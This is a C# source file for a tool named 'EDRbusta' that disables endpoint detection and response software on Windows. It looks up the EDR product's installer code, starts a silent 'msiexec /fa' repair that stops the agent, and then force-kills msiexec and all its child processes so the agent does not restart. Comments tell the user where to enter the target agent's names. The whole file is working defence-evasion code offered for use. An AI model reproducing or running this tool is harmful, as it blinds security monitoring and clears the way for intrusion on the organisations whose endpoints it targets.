using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace EDRbusta
{
    class Program
    {
        // Native API Constants
        private const uint SYNCHRONIZE = 0x00100000;
        private const uint PROCESS_TERMINATE = 0x0001;
        private const uint INFINITE = 0xFFFFFFFF;
        private const uint CREATE_NO_WINDOW = 0x08000000;
        private const uint STILL_ACTIVE = 259; // Process still running
        private const uint WAIT_OBJECT_0 = 0x00000000;
        private const uint QUERY_LIMITED_INFORMATION = 0x0400;

        // Native API Structs
        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            public IntPtr Reserved2_0;
            public IntPtr Reserved2_1;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public int cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        // Native API Functions
        [DllImport("ntdll.dll")]
        private static extern int NtQueryInformationProcess(
            IntPtr processHandle,
            int processInformationClass,
            ref PROCESS_BASIC_INFORMATION processInformation,
            uint processInformationLength,
            out uint returnLength
        );

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool TerminateProcess(IntPtr hProcess, int exitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("msi.dll", CharSet = CharSet.Auto)]
        private static extern int MsiEnumProducts(int iProductIndex, StringBuilder lpProductBuf);

        [DllImport("msi.dll", CharSet = CharSet.Auto)]
        private static extern int MsiGetProductInfo(string szProduct, string szProperty, StringBuilder lpValueBuf, ref int pcchValue);

        static void Main()
        {
            string processName = "EDRagent";         //replace edragent with actual EDR Agent process name (don't include .exe) 

            // Start the MSI installation in a separate task
             Task.Run(() => StartMSIInstallation());

            // Monitor processes by name
            MonitorProcessesByName(processName);
        }

        static void MonitorProcessesByName(string processName)
        {
            Console.WriteLine($"Monitoring {processName}.exe until all instances are terminated...");

            // Continuously check if the process is still running
            while (true)
            {
                var runningProcesses = Process.GetProcessesByName(processName);
                if (runningProcesses.Length == 0)
                {
                    Console.WriteLine($"All instances of {processName}.exe have exited.");
                    break;
                }

                // Sleep for a short interval before checking again
                Thread.Sleep(1000);
            }

            // Now proceed with the MSIExec kill process
            KillMSIExec();
        }

        static string findProductID()
        {
            Console.WriteLine("Find the Product ID for EDR application");
            string productName = "EDR AGENT NAME HERE";               // replace with full Product Name in PowerShell 'get-wmiobject Win32_Product | format-table IdentifyingNumber, Name'
            string productId = GetProductIdByName(productName);

            if (!string.IsNullOrEmpty(productId))
            {
                Console.WriteLine($"Product ID for {productName}: {productId}");
            }
            return productId;
        }

        static string GetProductIdByName(string targetProductName)
        {
            StringBuilder productCodeBuffer = new StringBuilder(39);
            int index = 0;

            while (MsiEnumProducts(index, productCodeBuffer) == 0)
            {
                string productCode = productCodeBuffer.ToString();

                StringBuilder nameBuffer = new StringBuilder(256);
                int nameSize = nameBuffer.Capacity;
                if (MsiGetProductInfo(productCode, "ProductName", nameBuffer, ref nameSize) == 0)
                {
                    string InstalledProductName = nameBuffer.ToString();
                    if (InstalledProductName.IndexOf(targetProductName, StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        return productCode;
                    }
                }

                index++;
            }
            return null;
        }

        static void StartMSIInstallation()
        {
            Console.WriteLine("Starting MSI installation for EDR Agent...");
            string EdrProductId = findProductID();
            if (string.IsNullOrEmpty(EdrProductId))
            {
                Console.WriteLine("Failed to find product ID, exiting...");
                return;
            }

            string command = $"msiexec.exe /fa \"{EdrProductId}\" /quiet";
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            si.cb = Marshal.SizeOf(si);

            bool result = CreateProcess(null, command, IntPtr.Zero, IntPtr.Zero, false, CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi);

            if (!result)
            {
                Console.WriteLine($"Failed to start MSI installation. Error: {Marshal.GetLastWin32Error()}");
            }
            else
            {
                Console.WriteLine($"Started MSI installation (PID: {pi.dwProcessId})");
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
        }

        static void KillMSIExec()
        {
            Console.WriteLine("Attempting to force kill MSIExec and all child processes...");

            // Find all msiexec.exe processes
            List<int> msiProcesses = new List<int>();
            foreach (var process in Process.GetProcessesByName("msiexec"))
            {
                msiProcesses.Add(process.Id);
            }

            // Kill all msiexec processes and their children
            foreach (var pid in msiProcesses)
            {
                KillProcessAndChildren(pid);
            }

            Console.WriteLine("MSIExec and its child processes have been terminated.");
        }

        static void KillProcessAndChildren(int pid)
        {
            IntPtr hProcess = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, false, (uint)pid);
            if (hProcess != IntPtr.Zero)
            {
                TerminateProcess(hProcess, 1); // Forcefully terminate the process
                CloseHandle(hProcess);
                Console.WriteLine($"Terminated parent process PID: {pid}");
            }

            List<int> childPIDs = GetChildProcesses(pid);
            foreach (int childPid in childPIDs)
            {
                KillProcessAndChildren(childPid); // Recursively kill child processes
            }
        }

        static List<int> GetChildProcesses(int parentId)
        {
            List<int> childProcesses = new List<int>();

            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    if (GetParentProcessId(process) == parentId)
                    {
                        childProcesses.Add(process.Id);
                    }
                }
                catch
                {
                    // Ignore errors when a process might not be accessible
                }
            }

            return childProcesses;
        }

        static int GetParentProcessId(Process process)
        {
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            uint returnLength;

            int status = NtQueryInformationProcess(process.Handle, 0, ref pbi, (uint)Marshal.SizeOf(pbi), out returnLength);
            if (status != 0)
            {
                throw new Exception($"NtQueryInformationProcess failed with status {status}");
            }

            return pbi.InheritedFromUniqueProcessId.ToInt32();
        }
    }
}
